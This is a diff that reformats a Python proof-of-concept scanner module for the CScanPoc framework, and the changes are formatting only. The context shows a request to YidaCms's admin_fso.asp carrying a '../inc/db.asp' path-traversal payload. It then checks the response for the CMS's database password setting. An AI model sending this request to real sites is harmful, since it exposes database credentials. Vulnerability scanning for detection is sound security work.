@@ -2,7 +2,9 @@
 
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import urllib.request, urllib.error, urllib.parse
+import urllib.request
+import urllib.error
+import urllib.parse
 
 
 class Vuln(ABVuln):
@@ -40,9 +42,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             # 属于验证后台漏洞，所以需要登录并且获取cookie，详情参考对应的PDF
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
@@ -55,7 +58,8 @@ class Poc(ABPoc):
             }
             verify_url = self.target + '/admin/admin_fso.asp?action=Edit'
             post_content = r'''FileId=../inc/db.asp&ThisDir='''
-            req = urllib.request.Request(verify_url, post_content, headers=headers)
+            req = urllib.request.Request(
+                verify_url, post_content, headers=headers)
             content = urllib.request.urlopen(req).read()
 
             if 'webpath' in content and 'YidaCms_Sqlpass' in content:
